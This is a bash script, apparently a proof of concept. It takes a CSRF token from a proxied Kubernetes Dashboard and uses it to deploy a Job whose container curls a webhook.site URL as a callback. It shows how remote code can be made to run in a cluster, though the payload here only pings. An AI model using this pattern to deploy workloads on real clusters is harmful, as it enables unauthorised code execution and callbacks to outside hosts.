#!/usr/bin/env bash
set -e

echo "Getting CSRF token..."
# Get the CSRF token
TOKEN_RESPONSE=$(curl -s 'http://127.0.0.1:8100/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy/api/v1/csrftoken/appdeploymentfromfile' \
  --compressed \
  -H 'Accept: application/json, text/plain, */*')

# Extract the token using jq instead of grep and cut
TOKEN=$(echo $TOKEN_RESPONSE | jq -r '.token')

if [ -z "$TOKEN" ]; then
  echo "Failed to get token"
  exit 1
fi

echo "Retrieved CSRF token: $TOKEN"

# Use the token to create a job
echo "Creating job..."
curl 'http://127.0.0.1:8100/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy/api/v1/appdeploymentfromfile' \
  -X POST \
  -H "X-CSRF-TOKEN: $TOKEN" \
  -H 'Content-Type: application/json' \
  --data-raw '{"name":"","namespace":"default","content":"apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: curl-job\n  labels:\n    app: curl-example\nspec:\n  template:\n    metadata:\n      labels:\n        app: curl-example\n    spec:\n      containers:\n      - name: curl-container\n        image: curlimages/curl:latest\n        command: [\"/bin/sh\", \"-c\"]\n        args:\n        - |\n          curl -s https://webhook.site/6dff5dd1-76d5-4034-9d5e-06ea6733777c || exit 0\n      restartPolicy: OnFailure\n  backoffLimit: 3\n  completions: 1","validate":true}'

echo "Job created"
